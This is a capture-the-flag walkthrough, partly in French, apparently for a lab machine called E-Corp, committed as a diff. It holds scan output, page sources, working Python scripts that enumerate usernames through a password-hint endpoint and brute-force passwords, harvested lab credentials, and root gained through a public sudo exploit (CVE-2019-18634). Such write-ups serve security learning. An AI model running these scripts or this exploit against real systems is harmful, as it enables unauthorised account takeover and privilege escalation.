@@ -1,0 +1,404 @@
+E-Corp
+
+IP Address
+10.10.209.173
+
+nmap -vv 10.10.209.173 -p-
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-23 13:44 CEST
+Initiating Ping Scan at 13:44
+Scanning 10.10.209.173 [2 ports]
+Completed Ping Scan at 13:44, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 13:44
+Completed Parallel DNS resolution of 1 host. at 13:44, 0.17s elapsed
+Initiating Connect Scan at 13:44
+Scanning 10.10.209.173 [65535 ports]
+Discovered open port 80/tcp on 10.10.209.173
+Discovered open port 8080/tcp on 10.10.209.173
+Discovered open port 22/tcp on 10.10.209.173
+
+http://10.10.209.173/ ET http://10.10.209.173:8080/
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Home - E-Corp</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" media="screen" href="main.css">
+    <script src="main.js"></script>
+</head>
+<body>
+    <div class="navbar">
+        <h1 class="title">E-Corp</h1>
+	<img src="imgs/ECorp.png" style="height: 100px" />
+        <button style="width:50px;" onclick="window.location='/login'">Login</button>
+    </div>
+    <p class="margin">Welcome to E-Corp, the world leading platform for all your IT need</p>
+    <p class="margin">Trusted since 2022, E-Corp has over 3000 users!</p>
+</body>
+</html>
+
+gobuster dir -u 10.10.54.213 -w ../../Downloads/common.txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.54.213
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                ../../Downloads/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2024/05/24 20:55:14 Starting gobuster in directory enumeration mode
+===============================================================
+/imgs                 (Status: 301) [Size: 0] [--> imgs/]
+/index.html           (Status: 301) [Size: 0] [--> ./]   
+/login                (Status: 301) [Size: 0] [--> login/]
+/notes                (Status: 301) [Size: 0] [--> notes/]
+/render/https://www.google.com (Status: 301) [Size: 0] [--> /render/https:/www.google.com]
+                                                                                          
+===============================================================
+2024/05/24 20:55:31 Finished
+===============================================================
+
+http://10.10.209.173/login/
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Login - E-Corp</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" media="screen" href="../main.css">
+    <script src="../main.js"></script>
+    <script src="login.js"></script>
+</head>
+<body onload="onLoad()">
+    <div class="navbar">
+        <h1 class="title">E-corp</h1>
+	<img src="../imgs/ECorp.png" style="height: 100px" />
+	<div style="width:50px;"></div>
+    </div>
+    <form onsubmit="login()" style="margin: 5px;"">
+        <h3>Login to E-Corp</h3>
+        <input id="username" name="username" placeholder="Username"><br>
+        <input id="password" name="password" placeholder="Password" type="password"><br>
+        <button id="loginButton" type="button" onclick="login()">Login</button>
+        <button onclick="forgotPassword()" type="button">I forgot my password</button>
+    </form>
+    <span id="status" class="margin"></span>
+    <span id="errorMessage" class="margin" style="color: red;"></span>
+    <span id="passwordHint" class="margin"></span>
+    <!-- Remember the company policy: color + two digits number -->
+    <form onsubmit="createUser()" style="margin: 5px;"">
+        <h3>No account? Make one here</h3>
+        <input id="usernameCreate" name="username" placeholder="Username"><br>
+        <input id="passwordCreate" name="password" placeholder="Password" type="password"><br>
+        <input id="passwordHintCreate" name="passwordHint" placeholder="Password hint"><br>
+        <button type="button" onclick="createUser()" id="userCreateButton">Create User</button>
+        <span id="statusCreation" class="margin"></span>
+        <span id="errorMessageCreation" class="margin" style="color: red;"></span>
+    </form>
+</body>
+</html>
+
+si on créer un compte :
+http://10.10.209.173/notes/
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Notes - E-Corp</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" media="screen" href="../main.css">
+    <script src="../main.js"></script>
+    <script src="note.js"></script>
+</head>
+<body onload="getNotes()">
+    <div class="navbar">
+        <h1 class="title">E-Corp</h1>
+	<img src="../imgs/ECorp.png" style="width:100px;" />
+        <button style="width:50px;" onclick="document.cookie='SessionToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';postData('/api/user/logout');window.location='/';">Logout</button>
+    </div>
+    <h2 class="margin">Your notes:</h2>
+    <button id="newNote" class="margin" onclick="noteDialog()">Create New Note</button>
+    <form id="notesForm" class="margin" style="display: none;">
+        <input id="Title" placeholder="Title" style="width: 50%"><br>
+        <textarea class="margin" id="Content" placeholder="Contents" type="text" style="width: 50%"></textarea><br>
+        <button id="newNoteButton" class="margin" type="button" onclick="createNote()">Create Note</button>
+        <button id="cancel" type="button" onclick="cancelNote()">Cancel</button>
+    </form>
+    <div id="notesDiv">
+    </div>
+</body>
+</html>
+
+http://10.10.209.173/login/login.js
+async function login() {
+    const username = document.querySelector("#username").value;
+    const password = document.querySelector("#password").value;
+    const button = document.querySelector("#loginButton");
+    button.disabled = true;
+    document.querySelector("#status").textContent = "Logging you in..."
+    const response = await postData("/api/user/login", { username: username, password: password });
+    console.log(response);
+    if (response.status !== undefined && response.status !== "success") {
+        document.querySelector("#status").textContent = "";
+        document.querySelector("#errorMessage").textContent = response.status
+        button.disabled = false;
+        return
+    }
+    if (response.SessionToken !== undefined) {
+        window.location = "/notes"
+    }
+}
+async function forgotPassword() {
+    //Based on username, find return password hint
+    var username = document.querySelector("#username").value;
+    const response = await getData("/api/user/passwordhint/" + username)
+    console.log(response)
+    if (response.hint !== undefined && response.hint !== "success") {
+        document.querySelector("#passwordHint").textContent = "Hint: "+response.hint
+        return
+    }
+}
+function getCookie(name) {
+    var v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
+    return v ? v[2] : null;
+}
+function onLoad() {
+    const session = getCookie("SessionToken");
+    console.log(session)
+    if (session !== null && session !== "") {
+        window.location = "/notes"
+    }
+}
+async function createUser() {
+    const button = document.querySelector("#userCreateButton");
+    const username = document.querySelector("#usernameCreate").value;
+    const password = document.querySelector("#passwordCreate").value;
+    const passwordHint = document.querySelector("#passwordHintCreate").value;
+    const user = {
+        Username: username,
+        Password: password,
+        PasswordHint: passwordHint
+    };
+    document.querySelector("#statusCreation").textContent = "Creating your account";
+    button.disabled = true;
+    const response = await postData("/api/user/create", user);
+    console.log(response)
+    if (response.status !== undefined) {
+        if (response.status !== "success") {
+            document.querySelector("#statusCreation").textContent = "";
+            document.querySelector("#errorMessage").textContent = response.status
+            return
+        }
+        document.querySelector("#statusCreation").textContent = "";
+        document.querySelector("#statusCreation").textContent = "Successfully created a user account";
+        document.querySelector("#usernameCreate").value = "";
+        document.querySelector("#passwordCreate").value = "";
+        document.querySelector("#passwordHintCreate").value = "";
+        return
+    }
+    document.querySelector("#statusCreation").textContent = "";
+    document.querySelector("#errorMessage").textContent = "Something went wrong..."
+}
+
+main.js
+console.log("Trust us, we're good!");
+async function postData(url = '', data = {}) {
+    // Default options are marked with *
+    const response = await fetch(url, {
+        method: 'POST', // *GET, POST, PUT, DELETE, etc.
+        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
+        credentials: 'same-origin', // include, *same-origin, omit
+        headers: {
+            'Content-Type': 'application/json'
+            // 'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        redirect: 'follow', // manual, *follow, error
+        referrerPolicy: 'no-referrer', // no-referrer, *client
+        body: JSON.stringify(data) // body data type must match "Content-Type" header
+    });
+    return await response.json(); // parses JSON response into native JavaScript objects
+}
+async function getData(url = '') {
+    // Default options are marked with *
+    const response = await fetch(url, {
+        method: 'GET', // *GET, POST, PUT, DELETE, etc.
+        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
+        credentials: 'same-origin', // include, *same-origin, omit
+        redirect: 'follow', // manual, *follow, error
+        referrerPolicy: 'no-referrer', // no-referrer, *client
+    });
+    return await response.json(); // parses JSON response into native JavaScript objects
+}
+async function whoami() {
+    console.log(getData("/api/user/whoami"));
+}
+
+Download the wordlist:
+You can download a comprehensive list of first names from the SecLists repository. For instance, you can download names.txt which contains a large number of common names.
+
+bash
+
+    wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt -O first_names.txt
+
+    Use the wordlist in your script:
+    Modify your Python script to read the names from this file.
+
+Here's the complete script to read from the downloaded wordlist file:
+
+python
+
+import requests
+
+# Define the base URL
+base_url = "http://10.10.54.213/api/user/passwordhint/"
+
+# Function to read the wordlist from a file
+def load_wordlist(file_path):
+    with open(file_path, 'r') as file:
+        return [line.strip() for line in file]
+
+# Function to check username using password hint endpoint
+def find_username(wordlist):
+    for username in wordlist:
+        url = f"{base_url}{username}"
+        try:
+            response = requests.get(url)
+            # Check if a valid response is returned (not 404)
+            if response.status_code != 404:
+                response_data = response.json()
+                if 'hint' in response_data and response_data['hint'] != "success":
+                    print(f"Username found: {username}")
+                    print(f"Password hint: {response_data['hint']}")
+                    return
+            else:
+                print(f"No hint found for '{username}', received 404 status code.")
+        except requests.exceptions.RequestException as e:
+            print(f"An error occurred: {e}")
+
+# Main function to test the usernames
+def main():
+    wordlist = load_wordlist('first_names.txt')
+    find_username(wordlist)
+
+if __name__ == "__main__":
+    main()
+
+Username found: angela
+Password hint: I just love white
+(white)
+
+Username found: elliot
+Password hint: All is not black or white
+(darkgray)
+
+Username found: tyler
+Password hint: Let's just say I didn't pick the blue pill
+(red)
+
+
+
+import requests
+
+# Define the base URL and login endpoint
+base_url = "http://10.10.54.213/api/user/login"
+
+# Define the username and password pattern
+username = "angela"
+
+# Function to attempt login with each password
+def attempt_login(username, password):
+    payload = {
+        "username": username,
+        "password": password
+    }
+    try:
+        response = requests.post(base_url, json=payload)
+        if response.status_code == 200:
+            response_data = response.json()
+            # Check if login is successful (assuming success status or token is provided)
+            if 'status' in response_data and response_data['status'] == 'success':
+                return True, response_data
+            elif 'SessionToken' in response_data:
+                return True, response_data
+        else:
+            print(f"Failed login attempt for password {password}, status code {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"An error occurred: {e}")
+    return False, None
+
+# Main function to iterate over passwords and attempt login
+def main():
+    for i in range(10):
+        for j in range(10):
+            password = f"white{i}{j}"
+            success, data = attempt_login(username, password)
+            if success:
+                print(f"Successful login!")
+                print(f"Username: {username}")
+                print(f"Password: {password}")
+                print(f"Response: {data}")
+                return
+            else:
+                print(f"Login failed for password: {password}")
+
+if __name__ == "__main__":
+    main()
+
+
+Username: angela
+Password: white11
+
+FTP user and password
+
+I can't connect to the femtocell but I heard my ftp password is Th3r3IsN0FtP
+
+
+
+Username: elliot
+Password: darkgray37
+
+SSH credentials
+
+Hello friend, that's pretty unsecure, but who cares, it's e-corp... My ssh pass Im_M1st3r_R0b0T
+
+
+
+Username: tyler
+Password: red42
+
+Secret
+
+Cute that you thought I would fall for this
+
+
+- pas de ftp ?
+ssh elliot@10.10.54.213
+elliot@e-corp:~$ ls
+user.txt
+elliot@e-corp:~$ cat user.txt
+EPI{H3Ll0_Fr13Nd}
+
+elliot@e-corp:~$ touch exploit.c
+elliot@e-corp:~$ nano exploit.c 
+
+https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c
+
+elliot@e-corp:~$ gcc -o exploit exploit.c 
+elliot@e-corp:~$ ./exploit 
+[sudo] password for elliot: 
+Sorry, try again.
+# ls
+exploit  exploit.c  user.txt
+# cd /root
+# ls
+root.txt
+# cat root.txt
+EPI{C0nTr0L_Is_4N_Il7uS10n}
+
